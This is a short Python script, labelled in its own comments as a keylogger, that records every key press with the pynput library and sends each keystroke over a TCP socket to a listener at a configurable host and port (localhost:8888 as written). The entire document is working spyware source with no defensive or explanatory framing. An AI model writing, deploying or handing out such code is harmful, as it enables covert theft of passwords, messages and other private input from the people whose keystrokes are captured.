import socket
from pynput import keyboard

target_host = "localhost"
target_port = 8888

# Create a TCP socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the target
client_socket.connect((target_host, target_port))

# Define the keylogger function
def on_press(key):
    log = str(key) + "\n"
    client_socket.sendall(log.encode())

# Start the keylogger
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Keep the program running until interrupted
try:
    while True:
        continue
except KeyboardInterrupt:
    # Stop the keylogger and close the socket
    listener.stop()
    client_socket.close()

